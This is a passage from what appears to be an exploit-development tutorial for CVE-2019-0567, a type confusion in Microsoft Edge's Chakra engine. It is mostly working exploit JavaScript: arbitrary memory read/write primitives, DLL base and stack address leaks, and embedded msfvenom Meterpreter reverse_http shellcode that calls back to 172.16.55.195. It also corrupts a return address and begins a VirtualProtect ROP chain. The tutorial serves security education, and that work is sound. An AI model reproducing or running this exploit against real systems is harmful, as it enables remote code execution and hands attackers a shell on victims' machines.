obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

// Create two DataView objects
dataview1 = new DataView(new ArrayBuffer(0x100));
dataview2 = new DataView(new ArrayBuffer(0x100));

// Function to convert to hex for memory addresses
function hex(x) {
    return x.toString(16);
}

// Arbitrary read function
function read64(lo, hi) {
    dataview1.setUint32(0x38, lo, true);        // DataView+0x38 = dataview2->buffer
    dataview1.setUint32(0x3C, hi, true);        // We set this to the memory address we want to read from (4 bytes at a time: e.g. 0x38 and 0x3C)

    // Instead of returning a 64-bit value here, we will create a 32-bit typed array and return the entire away
    // Write primitive requires breaking the 64-bit address up into 2 32-bit values so this allows us an easy way to do this
    var arrayRead = new Uint32Array(0x10);
    arrayRead[0] = dataview2.getInt32(0x0, true);   // 4-byte arbitrary read
    arrayRead[1] = dataview2.getInt32(0x4, true);   // 4-byte arbitrary read

    // Return the array
    return arrayRead;
}

// Arbitrary write function
function write64(lo, hi, valLo, valHi) {
    dataview1.setUint32(0x38, lo, true);        // DataView+0x38 = dataview2->buffer
    dataview1.setUint32(0x3C, hi, true);        // We set this to the memory address we want to write to (4 bytes at a time: e.g. 0x38 and 0x3C)

    // Perform the write with our 64-bit value (broken into two 4 bytes values, because of JavaScript)
    dataview2.setUint32(0x0, valLo, true);       // 4-byte arbitrary write
    dataview2.setUint32(0x4, valHi, true);       // 4-byte arbitrary write
}

// Function used to set prototype on tmp function to cause type transition on o object
function opt(o, proto, value) {
    o.b = 1;

    let tmp = {__proto__: proto};

    o.a = value;
}

// main function
function main() {
    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }

    let o = {a: 1, b: 2};

    opt(o, o, obj);     // Instead of supplying 0x1234, we are supplying our obj

    // Corrupt obj->auxSlots with the address of the first DataView object
    o.c = dataview1;

    // Corrupt dataview1->buffer with the address of the second DataView object
    obj.h = dataview2;

    // dataview1 methods act on dataview2 object
    // Since vftable is located from 0x0 - 0x8 in dataview2, we can simply just retrieve it without going through our read64() function
    vtableLo = dataview1.getUint32(0x0, true);
    vtableHigh = dataview1.getUint32(0x4, true);

    // Extract dataview2->type (located 0x8 - 0x10) so we can follow the chain of pointers to leak a stack address via...
    // ... type->javascriptLibrary->scriptContext->threadContext
    typeLo = dataview1.getUint32(0x8, true);
    typeHigh = dataview1.getUint32(0xC, true);

    // Print update
    document.write("[+] DataView object 2 leaked vtable from chakra.dll: 0x" + hex(vtableHigh) + hex(vtableLo));
    document.write("<br>");

    // Store the base of chakra.dll
    chakraLo = vtableLo - 0x5d0bf8;
    chakraHigh = vtableHigh;

    // Print update
    document.write("[+] chakra.dll base address: 0x" + hex(chakraHigh) + hex(chakraLo));
    document.write("<br>");

    // Leak a pointer to kernelbase.dll (KERNELBASE!DuplicateHandle) from the IAT of chakra.dll
    // chakra+0x5ee2b8 points to KERNELBASE!DuplicateHandle
    kernelbaseLeak = read64(chakraLo+0x5ee2b8, chakraHigh);

    // KERNELBASE!DuplicateHandle is 0x18de0 away from kernelbase.dll's base address
    kernelbaseLo = kernelbaseLeak[0]-0x18de0;
    kernelbaseHigh = kernelbaseLeak[1];

    // Store the pointer to KERNELBASE!DuplicateHandle (needed for our ACG bypass) into a more aptly named variable
    var duplicateHandle = new Uint32Array(0x4);
    duplicateHandle[0] = kernelbaseLeak[0];
    duplicateHandle[1] = kernelbaseLeak[1];

    // Print update
    document.write("[+] kernelbase.dll base address: 0x" + hex(kernelbaseHigh) + hex(kernelbaseLo));
    document.write("<br>");

    // Print update with our type pointer
    document.write("[+] type pointer: 0x" + hex(typeHigh) + hex(typeLo));
    document.write("<br>");

    // Arbitrary read to get the javascriptLibrary pointer (offset of 0x8 from type)
    javascriptLibrary = read64(typeLo+8, typeHigh);

    // Arbitrary read to get the scriptContext pointer (offset 0x450 from javascriptLibrary. Found this manually)
    scriptContext = read64(javascriptLibrary[0]+0x430, javascriptLibrary[1])

    // Arbitrary read to get the threadContext pointer (offset 0x3b8)
    threadContext = read64(scriptContext[0]+0x5c0, scriptContext[1]);

    // Leak a pointer to a pointer on the stack from threadContext at offset 0x8f0
    // https://bugs.chromium.org/p/project-zero/issues/detail?id=1360
    // Offsets are slightly different (0x8f0 and 0x8f8 to leak stack addresses)
    stackleakPointer = read64(threadContext[0]+0x8f8, threadContext[1]);

    // Print update
    document.write("[+] Leaked stack address! type->javascriptLibrary->scriptContext->threadContext->leafInterpreterFrame: 0x" + hex(stackleakPointer[1]) + hex(stackleakPointer[0]));
    document.write("<br>");

    // Counter
    let countMe = 0;

    // Helper function for counting
    function inc()
    {
        countMe+=0x8;
    }

    // Shellcode (will be executed in JIT process)
    // msfvenom -p windows/x64/meterpreter/reverse_http LHOST=172.16.55.195 LPORT=443 -f c
    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xe48348fc, 0x00cce8f0);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x51410000, 0x51525041);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x56d23148, 0x528b4865);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x528b4860, 0x528b4818);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc9314d20, 0x50728b48);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4ab70f48, 0xc031484a);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x7c613cac, 0x41202c02);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x410dc9c1, 0xede2c101);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x528b4852, 0x8b514120);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x01483c42, 0x788166d0);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x0f020b18, 0x00007285);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x88808b00, 0x48000000);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x6774c085, 0x44d00148);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x5020408b, 0x4918488b);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x56e3d001, 0x41c9ff48);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4d88348b, 0x0148c931);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc03148d6, 0x0dc9c141);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc10141ac, 0xf175e038);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x244c034c, 0xd1394508);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4458d875, 0x4924408b);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4166d001, 0x44480c8b);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x491c408b, 0x8b41d001);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x01488804, 0x415841d0);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x5a595e58, 0x59415841);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x83485a41, 0x524120ec);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4158e0ff, 0x8b485a59);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xff4be912, 0x485dffff);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4953db31, 0x6e6977be);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x74656e69, 0x48564100);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc749e189, 0x26774cc2);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x53d5ff07, 0xe1894853);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x314d5a53, 0xc9314dc0);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xba495353, 0xa779563a);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x0ee8d5ff);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x31000000, 0x312e3237);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x35352e36, 0x3539312e);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x89485a00, 0xc0c749c1);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x000001bb, 0x53c9314d);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x53036a53, 0x8957ba49);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x0000c69f, 0xd5ff0000);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x000023e8, 0x2d652f00);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x65503754, 0x516f3242);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x58643452, 0x6b47336c);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x67377674, 0x4d576c79);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x3764757a, 0x0078466a);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x53c18948, 0x4d58415a);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4853c931, 0x280200b8);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000084, 0x53535000);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xebc2c749, 0xff3b2e55);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc68948d5, 0x535f0a6a);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xf189485a, 0x4dc9314d);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x5353c931, 0x2dc2c749);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xff7b1806, 0x75c085d5);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc1c7481f, 0x00001388);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xf044ba49, 0x0000e035);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xd5ff0000, 0x74cfff48);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xe8cceb02, 0x00000055);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x406a5953, 0xd189495a);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4910e2c1, 0x1000c0c7);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xba490000, 0xe553a458);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x9348d5ff);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x89485353, 0xf18948e7);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x49da8948, 0x2000c0c7);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x89490000, 0x12ba49f9);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00e28996, 0xff000000);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc48348d5, 0x74c08520);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x078b66b2, 0x85c30148);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x58d275c0, 0x006a58c3);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc2c74959, 0x56a2b5f0);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x0000d5ff);
	inc();

    // We can reliably traverse the stack 0x6000 bytes
    // Scan the stack for the return address below
    /*
    0:020> u chakra+0xd4a73
    chakra!Js::JavascriptFunction::CallFunction<1>+0x83:
    00007fff`3a454a73 488b5c2478      mov     rbx,qword ptr [rsp+78h]
    00007fff`3a454a78 4883c440        add     rsp,40h
    00007fff`3a454a7c 5f              pop     rdi
    00007fff`3a454a7d 5e              pop     rsi
    00007fff`3a454a7e 5d              pop     rbp
    00007fff`3a454a7f c3              ret
    */

    // Creating an array to store the return address because read64() returns an array of 2 32-bit values
    var returnAddress = new Uint32Array(0x4);
    returnAddress[0] = chakraLo + 0xd4a73;
    returnAddress[1] = chakraHigh;

	// Counter variable
	let counter = 0x6000;

	// Loop
	while (counter != 0)
	{
	    // Store the contents of the stack
	    tempContents = read64(stackleakPointer[0]+counter, stackleakPointer[1]);

	    // Did we find our target return address?
        if ((tempContents[0] == returnAddress[0]) && (tempContents[1] == returnAddress[1]))
        {
			document.write("[+] Found our return address on the stack!");
            document.write("<br>");
            document.write("[+] Target stack address: 0x" + hex(stackleakPointer[1]) + hex(stackleakPointer[0]+counter));
            document.write("<br>");

            // Break the loop
            break;

        }
        else
        {
        	// Decrement the counter
	    	// This is because the leaked stack address is near the stack base so we need to traverse backwards towards the stack limit
	    	counter -= 0x8;
        }
	}

	// alert() for debugging
	alert("DEBUG");

	// Corrupt the return address to control RIP with 0x4141414141414141
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);
}
</script>
```

As we can clearly, see, we use our write primitive to write 1 QWORD at a time our shellcode (this is why we have `countMe+=0x8;`. Let's run our exploit, the same way we have been doing. When we run this exploit, an alert dialogue should occur _just before_ the stack address is overwritten. When the alert dialogue occurs, we can debug the content process (we have already seen how to find this process via Process Hacker, so I won't continually repeat this).

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion66.png" alt="">

After our exploit has ran, we can then examine where our shellcode _should_ have been written to: `chakra_base + 0x74b000`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion67.png" alt="">

If we cross reference the disassembly here with the [Metasploit Framework](https://github.com/rapid7/metasploit-framework/blob/04e8752b9b74cbaad7cb0ea6129c90e3172580a2/external/source/shellcode/windows/x64/src/stager/stager_reverse_https.asm) we can see that Metasploit staged-payloads will use the following stub to start execution.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion68.png" alt="">

As we can see, our injected shellcode and the Meterpreter shellcode both start with `cld` instruction to flush any flags and a stack alignment routine which ensure the stack is 10-byte aligned (Windows `__fastcall` requires this). We can now safely assume our shellcode was written properly to the `.data` section of `chakra.dll` within the content process.

Now that we have our payload, which we will execute at the end of our exploit, we can begin the exploitation process by starting with our "final" ROP chain.

`VirtualProtect` ROP Chain
---

Let me caveat this section by saying this ROP chain we are about to develop will _not_ be executed until the end of our exploit. However, it will be a moving part of our exploit going forward so we will go ahead and "knock it out now".

```html
<button onclick="main()">Click me to exploit CVE-2019-0567!</button>

<script>
// CVE-2019-0567: Microsoft Edge Type Confusion
// Author: Connor McGarr (@33y0re)

// Creating object obj
// Properties are stored via auxSlots since properties weren't declared inline
obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

// Create two DataView objects
dataview1 = new DataView(new ArrayBuffer(0x100));
dataview2 = new DataView(new ArrayBuffer(0x100));

// Function to convert to hex for memory addresses
function hex(x) {
    return x.toString(16);
}

// Arbitrary read function
function read64(lo, hi) {
    dataview1.setUint32(0x38, lo, true);        // DataView+0x38 = dataview2->buffer
    dataview1.setUint32(0x3C, hi, true);        // We set this to the memory address we want to read from (4 bytes at a time: e.g. 0x38 and 0x3C)

    // Instead of returning a 64-bit value here, we will create a 32-bit typed array and return the entire away
    // Write primitive requires breaking the 64-bit address up into 2 32-bit values so this allows us an easy way to do this
    var arrayRead = new Uint32Array(0x10);
    arrayRead[0] = dataview2.getInt32(0x0, true);   // 4-byte arbitrary read
    arrayRead[1] = dataview2.getInt32(0x4, true);   // 4-byte arbitrary read

    // Return the array
    return arrayRead;
}

// Arbitrary write function
function write64(lo, hi, valLo, valHi) {
    dataview1.setUint32(0x38, lo, true);        // DataView+0x38 = dataview2->buffer
    dataview1.setUint32(0x3C, hi, true);        // We set this to the memory address we want to write to (4 bytes at a time: e.g. 0x38 and 0x3C)

    // Perform the write with our 64-bit value (broken into two 4 bytes values, because of JavaScript)
    dataview2.setUint32(0x0, valLo, true);       // 4-byte arbitrary write
    dataview2.setUint32(0x4, valHi, true);       // 4-byte arbitrary write
}

// Function used to set prototype on tmp function to cause type transition on o object
function opt(o, proto, value) {
    o.b = 1;

    let tmp = {__proto__: proto};

    o.a = value;
}

// main function
function main() {
    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }

    let o = {a: 1, b: 2};

    opt(o, o, obj);     // Instead of supplying 0x1234, we are supplying our obj

    // Corrupt obj->auxSlots with the address of the first DataView object
    o.c = dataview1;

    // Corrupt dataview1->buffer with the address of the second DataView object
    obj.h = dataview2;

    // dataview1 methods act on dataview2 object
    // Since vftable is located from 0x0 - 0x8 in dataview2, we can simply just retrieve it without going through our read64() function
    vtableLo = dataview1.getUint32(0x0, true);
    vtableHigh = dataview1.getUint32(0x4, true);

    // Extract dataview2->type (located 0x8 - 0x10) so we can follow the chain of pointers to leak a stack address via...
    // ... type->javascriptLibrary->scriptContext->threadContext
    typeLo = dataview1.getUint32(0x8, true);
    typeHigh = dataview1.getUint32(0xC, true);

    // Print update
    document.write("[+] DataView object 2 leaked vtable from chakra.dll: 0x" + hex(vtableHigh) + hex(vtableLo));
    document.write("<br>");

    // Store the base of chakra.dll
    chakraLo = vtableLo - 0x5d0bf8;
    chakraHigh = vtableHigh;

    // Print update
    document.write("[+] chakra.dll base address: 0x" + hex(chakraHigh) + hex(chakraLo));
    document.write("<br>");

    // Leak a pointer to kernelbase.dll (KERNELBASE!DuplicateHandle) from the IAT of chakra.dll
    // chakra+0x5ee2b8 points to KERNELBASE!DuplicateHandle
    kernelbaseLeak = read64(chakraLo+0x5ee2b8, chakraHigh);

    // KERNELBASE!DuplicateHandle is 0x18de0 away from kernelbase.dll's base address
    kernelbaseLo = kernelbaseLeak[0]-0x18de0;
    kernelbaseHigh = kernelbaseLeak[1];

    // Store the pointer to KERNELBASE!DuplicateHandle (needed for our ACG bypass) into a more aptly named variable
    var duplicateHandle = new Uint32Array(0x4);
    duplicateHandle[0] = kernelbaseLeak[0];
    duplicateHandle[1] = kernelbaseLeak[1];

    // Print update
    document.write("[+] kernelbase.dll base address: 0x" + hex(kernelbaseHigh) + hex(kernelbaseLo));
    document.write("<br>");

    // Print update with our type pointer
    document.write("[+] type pointer: 0x" + hex(typeHigh) + hex(typeLo));
    document.write("<br>");

    // Arbitrary read to get the javascriptLibrary pointer (offset of 0x8 from type)
    javascriptLibrary = read64(typeLo+8, typeHigh);

    // Arbitrary read to get the scriptContext pointer (offset 0x450 from javascriptLibrary. Found this manually)
    scriptContext = read64(javascriptLibrary[0]+0x430, javascriptLibrary[1])

    // Arbitrary read to get the threadContext pointer (offset 0x3b8)
    threadContext = read64(scriptContext[0]+0x5c0, scriptContext[1]);

    // Leak a pointer to a pointer on the stack from threadContext at offset 0x8f0
    // https://bugs.chromium.org/p/project-zero/issues/detail?id=1360
    // Offsets are slightly different (0x8f0 and 0x8f8 to leak stack addresses)
    stackleakPointer = read64(threadContext[0]+0x8f8, threadContext[1]);

    // Print update
    document.write("[+] Leaked stack address! type->javascriptLibrary->scriptContext->threadContext->leafInterpreterFrame: 0x" + hex(stackleakPointer[1]) + hex(stackleakPointer[0]));
    document.write("<br>");

    // Counter
    let countMe = 0;

    // Helper function for counting
    function inc()
    {
        countMe+=0x8;
    }

    // Shellcode (will be executed in JIT process)
    // msfvenom -p windows/x64/meterpreter/reverse_http LHOST=172.16.55.195 LPORT=443 -f c
    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xe48348fc, 0x00cce8f0);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x51410000, 0x51525041);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x56d23148, 0x528b4865);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x528b4860, 0x528b4818);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc9314d20, 0x50728b48);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4ab70f48, 0xc031484a);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x7c613cac, 0x41202c02);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x410dc9c1, 0xede2c101);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x528b4852, 0x8b514120);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x01483c42, 0x788166d0);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x0f020b18, 0x00007285);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x88808b00, 0x48000000);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x6774c085, 0x44d00148);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x5020408b, 0x4918488b);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x56e3d001, 0x41c9ff48);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4d88348b, 0x0148c931);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc03148d6, 0x0dc9c141);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc10141ac, 0xf175e038);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x244c034c, 0xd1394508);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4458d875, 0x4924408b);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4166d001, 0x44480c8b);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x491c408b, 0x8b41d001);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x01488804, 0x415841d0);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x5a595e58, 0x59415841);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x83485a41, 0x524120ec);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4158e0ff, 0x8b485a59);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xff4be912, 0x485dffff);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4953db31, 0x6e6977be);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x74656e69, 0x48564100);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc749e189, 0x26774cc2);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x53d5ff07, 0xe1894853);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x314d5a53, 0xc9314dc0);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xba495353, 0xa779563a);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x0ee8d5ff);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x31000000, 0x312e3237);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x35352e36, 0x3539312e);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x89485a00, 0xc0c749c1);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x000001bb, 0x53c9314d);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x53036a53, 0x8957ba49);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x0000c69f, 0xd5ff0000);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x000023e8, 0x2d652f00);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x65503754, 0x516f3242);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x58643452, 0x6b47336c);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x67377674, 0x4d576c79);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x3764757a, 0x0078466a);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x53c18948, 0x4d58415a);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4853c931, 0x280200b8);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000084, 0x53535000);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xebc2c749, 0xff3b2e55);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc68948d5, 0x535f0a6a);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xf189485a, 0x4dc9314d);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x5353c931, 0x2dc2c749);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xff7b1806, 0x75c085d5);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc1c7481f, 0x00001388);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xf044ba49, 0x0000e035);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xd5ff0000, 0x74cfff48);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xe8cceb02, 0x00000055);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x406a5953, 0xd189495a);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4910e2c1, 0x1000c0c7);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xba490000, 0xe553a458);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x9348d5ff);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x89485353, 0xf18948e7);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x49da8948, 0x2000c0c7);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x89490000, 0x12ba49f9);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00e28996, 0xff000000);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc48348d5, 0x74c08520);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x078b66b2, 0x85c30148);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x58d275c0, 0x006a58c3);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc2c74959, 0x56a2b5f0);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x0000d5ff);
	inc();

	// Store where our ROP chain begins
	ropBegin = countMe;

	// Increment countMe (which is the variable used to write 1 QWORD at a time) by 0x50 bytes to give us some breathing room between our shellcode and ROP chain
	countMe += 0x50;

	// VirtualProtect() ROP chain (will be called in the JIT process)
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x577fd4, chakraHigh);         // 0x180577fd4: pop rax ; ret
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x72E128, chakraHigh);         // .data pointer from chakra.dll with a non-zero value to bypass cmp r8d, [rax] future gadget
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x46377, chakraHigh);          // 0x180046377: pop rcx ; ret
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x74e030, chakraHigh);         // PDWORD lpflOldProtect (any writable address -> Eventually placed in R9)
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0xf6270, chakraHigh);          // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x46377, chakraHigh);          // 0x180046377: pop rcx ; ret
    inc();

    // Store the current offset within the .data section into a var
    ropoffsetOne = countMe;

    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x00000000);                // LPVOID lpAddress (Eventually will be updated to the address we want to mark as RWX, our shellcode)
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x1d2c9, chakraHigh);          // 0x18001d2c9: pop rdx ; ret
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00001000, 0x00000000);                // SIZE_T dwSize (0x1000)
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000040, 0x00000000);                // DWORD flNewProtect (PAGE_EXECUTE_READWRITE)
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x577fd4, chakraHigh);         // 0x180577fd4: pop rax ; ret
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, kernelbaseLo+0x61700, kernelbaseHigh);  // KERNELBASE!VirtualProtect
    inc();
